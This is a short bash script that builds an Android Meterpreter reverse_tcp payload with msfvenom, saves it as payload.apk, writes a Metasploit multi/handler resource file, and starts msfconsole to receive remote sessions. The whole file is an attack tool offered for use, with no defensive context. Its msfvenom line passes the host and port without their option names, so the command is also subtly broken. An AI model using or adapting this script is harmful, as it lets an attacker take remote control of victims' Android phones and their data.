#!/bin/bash


read -p "Enter your LHOST (IP address): " LHOST
read -p "Enter your LPORT (Port number): " LPORT

msfvenom -p android/meterpreter/reverse_tcp $LHOST $LPORT > payload.apk
ls

cat <<EOF > metasploit_script.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit
EOF

msfconsole -r metasploit_script.rc
